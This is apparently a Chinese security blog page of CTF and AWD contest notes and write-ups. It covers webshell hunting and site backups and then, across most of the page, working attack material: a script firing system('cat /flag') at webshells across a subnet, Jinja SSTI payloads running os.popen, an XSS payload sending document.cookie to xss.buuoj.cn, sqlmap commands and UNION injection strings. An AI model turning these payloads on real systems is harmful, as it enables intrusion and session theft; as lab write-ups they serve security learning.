<p><a target="_blank" rel="noopener" href="https://phpchip.com/">https://phpchip.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a></p>
<ul>
<li>本地查杀</li>
</ul>
<p>D盾、Seay</p>
<ul>
<li>服务器命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;</span><br><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;</span><br><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</span><br></pre></td></tr></table></figure>



<h2 id="流量-日志分析"><a href="#流量-日志分析" class="headerlink" title="流量\日志分析"></a>流量\日志分析</h2><p>将攻击流量dump下来，分析。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -s 0 port xxxx -w flow.pcap</span><br></pre></td></tr></table></figure>



<p>有root权限的话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有root权限</span><br><span class="line">那麽，这样就简单了，直接写在配置中。</span><br><span class="line"></span><br><span class="line">vim php.ini</span><br><span class="line"></span><br><span class="line">auto_append_file &#x3D; “&#x2F;dir&#x2F;path&#x2F;phpwaf.php”</span><br><span class="line"></span><br><span class="line">重启Apache或者php-fpm就能生效了。</span><br><span class="line"></span><br><span class="line">当然也可以写在 .user.ini 或者 .htaccess 中。</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file “&#x2F;dir&#x2F;path&#x2F;phpwaf.php”</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>];   <span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">&quot;QUERY_STRING&quot;</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">&#x27;来访时间：&#x27;</span>.$time.<span class="string">&#x27;--&gt;&#x27;</span>.<span class="string">&#x27;访问链接：&#x27;</span>.<span class="string">&#x27;http://&#x27;</span>.$ip.$filename.<span class="string">&#x27;?&#x27;</span>.$parameter.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">&quot;/tmp/log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="备份网站源码"><a href="#备份网站源码" class="headerlink" title="备份网站源码"></a>备份网站源码</h2><p>防止被删站。。之前去参观安洵杯线下AWD的时候，有一个队就是批量扫除其他选手的网站。让其他选手被check，那么久相当于自己得分咯。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打包目录</span><br><span class="line">tar -zcvf web.tar.gz &#x2F;var&#x2F;www&#x2F;html 备份源码</span><br><span class="line">tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;path&#x2F;web</span><br><span class="line"># 解包</span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><p>针对mysql数据库，如果被搅屎了，数据库也被删了，就算网站有备份也没用啊。因为没数据库文件，网站也不能过check。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">备份</span><br><span class="line">[root@localhost ~]# cd &#x2F;var&#x2F;lib&#x2F;mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span><br><span class="line">[root@localhost mysql]# mysqldump -u 用户名 -p 数据库名&gt;导出的文件名</span><br><span class="line">mysqldump -u root -p 数据库名&gt;Test0809.sql，输入密码即可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 备份指定的多个数据库</span><br><span class="line">mysqldump -u root -p --databases choose test &gt; &#x2F;tmp&#x2F;db.sql</span><br><span class="line"># 恢复备份，在mysql终端下执行：</span><br><span class="line"># 命令格式：source FILE_PATH</span><br><span class="line">source ~&#x2F;db.sql</span><br><span class="line"># 曾经遇到一个备份有问题可以执行下面</span><br><span class="line">mysqldump -u root --all-databases —skip-lock-tables &gt; &#x2F;tmp&#x2F;db.sql</span><br><span class="line"># 重置mysql密码</span><br><span class="line"># 方法1：用SET PASSWORD命令</span><br><span class="line">mysql&gt; set password for 用户名@localhost &#x3D; password(&#39;新密码&#39;);</span><br><span class="line"># 方法2：用mysqladmin</span><br><span class="line">mysqladmin -u用户名 -p旧密码 password 新密码</span><br></pre></td></tr></table></figure>

<h2 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h2><p>有时候权限不够，可能没办法删除，注释掉就行了。</p>
<p>修改其中的地址、shell路径和密码即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.&quot;</span></span><br><span class="line">url1=<span class="string">&quot;&quot;</span></span><br><span class="line">shell=<span class="string">&quot;/Upload/index.php&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot;</span> </span><br><span class="line">port=<span class="string">&quot;80&quot;</span></span><br><span class="line">payload = &#123;passwd: <span class="string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;</span><br><span class="line">f=open(<span class="string">&quot;webshelllist.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) </span><br><span class="line">f1=open(<span class="string">&quot;firstround_flag.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </span><br><span class="line">    url1=url+str(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">print</span> url1+<span class="string">&quot; connect shell sucess,flag is &quot;</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">&quot; connect shell sucess,flag is &quot;</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">&quot;,&quot;</span>+passwd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;shell 404&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> url1+<span class="string">&quot; connect shell fail&quot;</span></span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://mang0.me/archis/49b464e6/">http://mang0.me/archis/49b464e6/</a></p>
<ul>
<li>处理不死马</li>
</ul>
<p>kill 进程、删马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    $pid=<span class="number">1234</span>;</span><br><span class="line">    @unlink(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    exec(<span class="string">&#x27;kill -9 $pid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
<p>前面的大部分都是针对PHP的，下来来看看python和java的。主要是如何修洞。</p>
<h2 id="Python-AWD"><a href="#Python-AWD" class="headerlink" title="Python AWD"></a>Python AWD</h2><h2 id="Java-AWD"><a href="#Java-AWD" class="headerlink" title="Java AWD"></a>Java AWD</h2><h2 id="NodeJS-AWD"><a href="#NodeJS-AWD" class="headerlink" title="NodeJS AWD"></a>NodeJS AWD</h2><h1 id="CTF-Jeopardy"><a href="#CTF-Jeopardy" class="headerlink" title="CTF Jeopardy"></a>CTF Jeopardy</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><ul>
<li>RC4</li>
<li>SSTI</li>
</ul>
<p>![image-20201207005524605](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207005524605.png)</p>
<p>rc4 加密的key：HereIsTreasure</p>
<p>绿色框里面，将 输入的 secret， 进行加密后，模板渲染，那么这里就存在SSTI。具体safe函数如何可以不用管。</p>
<p>在线加解密：<a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rc4.html">https://www.sojson.com/encrypt_rc4.html</a></p>
<p>WP: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12653579.html">https://www.cnblogs.com/h3zh1/p/12653579.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5644">https://xz.aliyun.com/t/5644</a></p>
<blockquote>
<p>RC4加密算法是一种对称加密算法。所谓对称加密算法，说得直白一点，就是加密与解密的过程一模一样。假设定义RC4的运算过程是rc4(key,data)，那么，密文=rc4(key,明文)，明文=rc4(key,密文)。这种对称性就是基于秘钥流的加密算法的特征之一，RC4本质上就是一种秘钥流生成算法。其特点就是简单、运行效率高，不会占用过多的CPU，因此常用在很多旧无线网卡的WEP加密。</p>
</blockquote>
<p>py加密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>靶机无法访问外网，请使用 <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/">xss.buuoj.cn</a></p>
<p>反馈时请使用 web 来代替地址中的靶机域名。</p>
<ul>
<li>祖传 CTF md5 验证码。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000001</span>):</span><br><span class="line">    s = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;f3ff5e&quot;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<ul>
<li>XSS 打 管理员 cookie、伪造管理员登录。</li>
<li>管理员后台sql注入</li>
</ul>
<p>网站功能：注册，投稿，投稿会返回链接，反馈，反馈可以带上链接，并且是管理员来审核。明显的XSS。</p>
<p>先尝试一下xss 探测，发现() 变为了中文的（）。所以需要用HTML Markup转码</p>
<p>并且是存在CSP的</p>
<p>![image-20201207014942208](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207014942208.png)</p>
<p>csp利用跳转绕过姿势：</p>
<blockquote>
<p>大部分情况，csp不会限制跳转，CSP如果限制跳转会影响很多的网站功能；或者是<code>script-src &#39;unsafe-inline&#39;;</code>这条规则。<br>这个地方可以用location跳转：location.href(window.location/window.open)绕过</p>
</blockquote>
<p>利用条件:</p>
<ol>
<li>可以执行任意JS脚本，但是由于CSP无法数据带外</li>
<li>csp为<code>script-src &#39;unsafe-inline&#39;;</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss=<span class="string">&#x27;&#x27;&#x27;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=o9waGH&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&#x27;&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">&quot;&amp;#&quot;</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;</span> + output + <span class="string">&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>将文章链接复制进去反馈提交，xss 平台收到cookie。</p>
<p>![image-20201207095651597](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207095651597.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">──&gt; python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;e802dd5d-b07e-4f2b-8596-6276e5fe7682.node3.buuoj.cn&#x2F;admin.php?id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;2690bd948c1aa895e2fc6cfff3cf09a3&quot; -T flag --dump --flush-session --fresh-queries</span><br></pre></td></tr></table></figure>

<p>![image-20201207095633362](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207095633362.png)</p>
<p>这里有个坑，就是在提交链接的时候，要改一下，不能直接复制链接进去。要改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web&#x2F;post&#x2F;8ca25c72652829840967218a239ee6bb.html</span><br></pre></td></tr></table></figure>

<p>这样的才行。。。</p>
<hr>
<p>参考 glzjin师傅wp</p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6100.html">https://www.zhaoj.in/read-6100.html</a></p>
<p>csp绕过，cl4y师傅：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7372#toc-4">https://xz.aliyun.com/t/7372#toc-4</a></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h3 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a>取证分析</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/d554.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/d554.html" class="post-title-link" itemprop="url">CTFer 从0到1配套题目刷题题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-06 11:01:06" itemprop="dateCreated datePublished" datetime="2020-12-06T11:01:06+08:00">2020-12-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-12-07 00:43:24" itemprop="dateModified" datetime="2020-12-07T00:43:24+08:00">2020-12-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h1><ul>
<li>robots.txt</li>
<li>index.php~</li>
<li>.index.php.swp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1:n1book&#123;info_1</span><br></pre></td></tr></table></figure>

<p>flag2:s_v3ry_im</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;flag3:p0rtant_hack&#125;&#39;;?&gt;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
<h1 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h1><ul>
<li>git 泄露</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;d636ae84-4f9d-4659-abf7-4922917cecb7.node3.buuoj.cn&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>

<p>n1book{git_looks_s0_easyfun}</p>
<h1 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h1><p>注意：注入的时候，url中输入 <code>%23</code> 和 <code>#</code> 是有区别的。</p>
<p>sb 解法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;24fa16a1-00e7-47c3-bb66-157021761eab.node3.buuoj.cn&#x2F;index.php\?id\&#x3D;1 -D note -T fl4g -C fllllag --dump</span><br></pre></td></tr></table></figure>

<p>手工注入：</p>
<p>判断注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004013.png" alt="image-20201206113036212"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004036.png" alt="image-20201206113057122"></p>
<p>order by 判定字段数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004051.png" alt="image-20201206113133681"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004151.png" alt="image-20201206113154835"></p>
<p>确定回显位</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004209.png" alt="image-20201206113236221"></p>
<p>在2、3的地方可以注入</p>
<p>数据库为 note</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004221.png" alt="image-20201206113306728"></p>
<p>查表名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;note&#39;%23</span><br></pre></td></tr></table></figure>

<p><strong>fl4g,notes</strong><br>查列名：为：<strong>fllllag</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;%23</span><br></pre></td></tr></table></figure>

<p>查flag的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#39; union select 1, group_concat(fllllag),3 from fl4g %23</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004232.png" alt="image-20201206113934103"></p>
<h1 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h1><p>伪协议读文件。直接读<code>p=flag</code>是不行的，所以用伪协议封装一下就好了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004243.png" alt="image-20201206114753925"></p>
<h1 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h1><p>Nginx错误配置可能产生目录穿越漏洞，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static &#123;</span><br><span class="line">    alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003958.png" alt="image-20201206123641071"></p>
<h1 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h1><p>select 被过滤了，大小写绕过。</p>
